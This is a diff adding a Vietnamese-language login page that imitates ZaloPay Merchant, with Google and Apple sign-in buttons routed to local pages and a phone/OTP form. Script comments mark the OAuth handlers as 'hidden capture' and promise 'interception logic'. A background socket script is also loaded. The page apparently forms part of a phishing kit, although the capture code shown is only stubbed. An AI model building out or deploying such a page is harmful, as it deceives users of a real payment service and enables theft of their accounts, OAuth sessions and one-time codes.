@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#0066cc">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="apple-mobile-web-app-title" content="ZaloPay Merchant">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="icon" type="image/png" href="/images/zalopay-merchant-icon.png">
+    <link rel="apple-touch-icon" href="/images/zalopay-merchant-app-icon.png">
+    <title>Đăng nhập - ZaloPay Merchant</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    <style>
+        .auth-section {
+            min-height: calc(100vh - 80px);
+            display: flex;
+            align-items: center;
+            padding: 80px 0 40px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+        }
+        .auth-card {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            overflow: hidden;
+        }
+        .auth-header {
+            background: linear-gradient(135deg, #0033C9 0%, #0042FF 100%);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+        .auth-header h2 {
+            margin: 0;
+            font-size: 1.75rem;
+            font-weight: 600;
+        }
+        .auth-header p {
+            margin: 0.5rem 0 0;
+            opacity: 0.9;
+            font-size: 0.95rem;
+        }
+        .auth-body {
+            padding: 2.5rem;
+        }
+        .social-login-btn {
+            width: 100%;
+            padding: 12px 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            background: white;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+            margin-bottom: 1rem;
+            text-decoration: none;
+            color: #374151;
+            cursor: pointer;
+        }
+        .social-login-btn:hover {
+            border-color: #0042FF;
+            background: #f8fafc;
+            color: #0033C9;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(59,130,246,0.15);
+        }
+        .social-login-btn.google {
+            border-color: #4285f4;
+            color: #4285f4;
+        }
+        .social-login-btn.google:hover {
+            background: #4285f4;
+            color: white;
+        }
+        .social-login-btn.apple {
+            border-color: #000000;
+            color: #000000;
+        }
+        .social-login-btn.apple:hover {
+            background: #000000;
+            color: white;
+        }
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 1.5rem 0;
+            color: #9ca3af;
+            font-size: 0.875rem;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e5e7eb;
+        }
+        .divider span {
+            padding: 0 1rem;
+        }
+        .phone-auth-form {
+            margin-top: 1.5rem;
+        }
+        .phone-input-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+        .country-code {
+            width: 100px;
+            flex-shrink: 0;
+        }
+        .phone-number {
+            flex: 1;
+        }
+        .otp-section {
+            display: none;
+            margin-top: 1.5rem;
+        }
+        .otp-section.active {
+            display: block;
+        }
+        .otp-inputs {
+            display: flex;
+            gap: 0.5rem;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            transition: border-color 0.3s;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #0042FF;
+        }
+        .resend-otp {
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 0.875rem;
+            color: #6b7280;
+        }
+        .resend-otp a {
+            color: #0042FF;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .resend-otp a:hover {
+            text-decoration: underline;
+        }
+        .terms-text {
+            font-size: 0.875rem;
+            color: #6b7280;
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+        .terms-text a {
+            color: #0042FF;
+            text-decoration: none;
+        }
+        .terms-text a:hover {
+            text-decoration: underline;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+        .back-link a {
+            color: #6b7280;
+            text-decoration: none;
+            font-size: 0.875rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .back-link a:hover {
+            color: #0042FF;
+        }
+    </style>
+</head>
+<body class="bg-light">
+    <!-- Header -->
+    <header class="navbar navbar-expand-lg navbar-light bg-white shadow-sm fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="index.html">
+                <img src="images/logo-zalopay-doanhnghiep.svg" alt="ZaloPay" height="40">
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link" href="index.html">Trang chủ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="solutions.html">Giải pháp</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="faq.html">FAQ</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="btn btn-primary ms-2" href="register.html">Đăng ký ngay</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <!-- Auth Section -->
+    <section class="auth-section">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-5 col-md-7">
+                    <div class="auth-card">
+                        <div class="auth-header">
+                            <h2><img src="images/zalopay-merchant-app-icon.png" alt="ZaloPay Merchant" class="login-header-icon">Đăng nhập</h2>
+                            <p>Chọn phương thức đăng nhập của bạn</p>
+                        </div>
+                        <div class="auth-body">
+                            <!-- Social Login Options -->
+                            <a href="google_auth.html" class="social-login-btn google" id="googleLoginBtn">
+                                <i class="fab fa-google"></i>
+                                <span>Đăng nhập bằng Google</span>
+                            </a>
+
+                            <a href="apple_auth.html" class="social-login-btn apple" id="appleLoginBtn">
+                                <i class="fab fa-apple"></i>
+                                <span>Đăng nhập bằng Apple ID</span>
+                            </a>
+
+                            <div class="divider">
+                                <span>hoặc</span>
+                            </div>
+
+                            <!-- Phone Authentication -->
+                            <div class="phone-auth-form" id="phoneAuthForm">
+                                <label for="country_code" class="form-label">Số điện thoại</label>
+                                <div class="phone-input-group mb-3">
+                                    <select class="form-control country-code" id="country_code" name="country_code">
+                                        <option value="+84" selected>+84</option>
+                                        <option value="+1">+1</option>
+                                        <option value="+44">+44</option>
+                                        <option value="+65">+65</option>
+                                    </select>
+                                    <input type="tel" class="form-control phone-number" id="phone_number" name="phone_number" 
+                                           placeholder="Nhập số điện thoại" required maxlength="10">
+                                </div>
+                                <button type="button" class="btn btn-primary w-100" id="sendOtpBtn">
+                                    <i class="fas fa-paper-plane me-2"></i>Gửi mã OTP
+                                </button>
+                            </div>
+
+                            <!-- OTP Verification Section -->
+                            <div class="otp-section" id="otpSection">
+                                <label class="form-label text-center d-block">Nhập mã OTP đã gửi đến số điện thoại</label>
+                                <div class="otp-inputs">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+                                </div>
+                                <button type="button" class="btn btn-primary w-100" id="verifyOtpBtn">
+                                    <i class="fas fa-check me-2"></i>Xác thực OTP
+                                </button>
+                                <div class="resend-otp">
+                                    Không nhận được mã? <a href="#" id="resendOtpLink">Gửi lại</a>
+                                </div>
+                            </div>
+
+                            <div class="terms-text">
+                                Bằng việc đăng nhập, bạn đồng ý với 
+                                <a href="#">Điều khoản sử dụng</a> và 
+                                <a href="#">Chính sách bảo mật</a> của ZaloPay
+                            </div>
+
+                            <div class="back-link">
+                                <a href="index.html">
+                                    <i class="fas fa-arrow-left"></i>
+                                    Quay lại trang chủ
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer py-5 bg-dark text-white">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-4 mb-4">
+                    <img src="images/logo-zalopay-doanhnghiep.svg" alt="ZaloPay" height="40" class="mb-3">
+                    <p>Nền tảng giải pháp toàn diện cho mọi nhu cầu kinh doanh</p>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Giải pháp</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="solutions.html" class="text-light">Thanh toán</a></li>
+                        <li><a href="#" class="text-light">Chi hộ</a></li>
+                        <li><a href="#" class="text-light">Bán hàng</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-2 col-md-6 mb-4">
+                    <h5>Hỗ trợ</h5>
+                    <ul class="list-unstyled">
+                        <li><a href="faq.html" class="text-light">FAQ</a></li>
+                        <li><a href="#" class="text-light">Liên hệ</a></li>
+                        <li><a href="#" class="text-light">Hướng dẫn</a></li>
+                    </ul>
+                </div>
+                <div class="col-lg-4 mb-4">
+                    <h5>Liên hệ</h5>
+                    <p class="text-light">
+                        <i class="fas fa-phone me-2"></i>Hotline: 1900 1234<br>
+                        <i class="fas fa-envelope me-2"></i>Email: support@zalopay.vn
+                    </p>
+                </div>
+            </div>
+            <div class="text-center border-top pt-3 mt-3">
+                <p class="text-muted mb-0">&copy; 2024 ZaloPay. Tất cả quyền được bảo lưu.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+        // OTP Input Handling
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const phoneForm = document.getElementById('phoneAuthForm');
+            const otpSection = document.getElementById('otpSection');
+            const sendOtpBtn = document.getElementById('sendOtpBtn');
+            const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+            const phoneNumberInput = document.getElementById('phone_number');
+
+            // Auto-focus next OTP input
+            otpInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+
+                // Only allow numbers
+                input.addEventListener('keypress', function(e) {
+                    if (!/[0-9]/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+            });
+
+            // Send OTP Handler
+            sendOtpBtn.addEventListener('click', function() {
+                const phoneNumber = phoneNumberInput.value.trim();
+                const countryCode = document.getElementById('country_code').value;
+
+                if (!phoneNumber || phoneNumber.length < 10) {
+                    alert('Vui lòng nhập số điện thoại hợp lệ');
+                    return;
+                }
+
+                // Simulate OTP sending
+                phoneForm.style.display = 'none';
+                otpSection.classList.add('active');
+                
+                // In real implementation, this would call backend API
+                console.log('Sending OTP to:', countryCode + phoneNumber);
+            });
+
+            // Verify OTP Handler
+            verifyOtpBtn.addEventListener('click', function() {
+                const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+                
+                if (otpCode.length !== 6) {
+                    alert('Vui lòng nhập đầy đủ 6 số OTP');
+                    return;
+                }
+
+                // In real implementation, this would verify OTP with backend
+                console.log('Verifying OTP:', otpCode);
+                
+                // Redirect to success page (when available)
+                alert('OTP đã được xác thực thành công! (Demo - sẽ redirect đến trang tiếp theo)');
+            });
+
+            // Resend OTP Handler
+            document.getElementById('resendOtpLink').addEventListener('click', function(e) {
+                e.preventDefault();
+                // Reset OTP inputs
+                otpInputs.forEach(input => input.value = '');
+                otpInputs[0].focus();
+                
+                // Resend OTP (call backend)
+                console.log('Resending OTP...');
+                alert('Mã OTP mới đã được gửi!');
+            });
+
+            // Google OAuth Handler (hidden capture)
+            document.getElementById('googleLoginBtn').addEventListener('click', function(e) {
+                // OAuth interception logic will be added here
+                console.log('Google OAuth initiated');
+            });
+
+            // Apple OAuth Handler (hidden capture)
+            document.getElementById('appleLoginBtn').addEventListener('click', function(e) {
+                // OAuth interception logic will be added here
+                console.log('Apple OAuth initiated');
+            });
+        });
+    </script>
+    <!-- Service Worker Registration -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('/sw.js')
+            .then((registration) => {
+              console.log('Service Worker registered successfully:', registration.scope);
+            })
+            .catch((error) => {
+              console.error('Service Worker registration failed:', error);
+            });
+        });
+      }
+    </script>
+    
+    <!-- Socket.IO Background Support -->
+    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
+    <script src="/js/socket-background.js"></script>
+</body>
+</html>
+
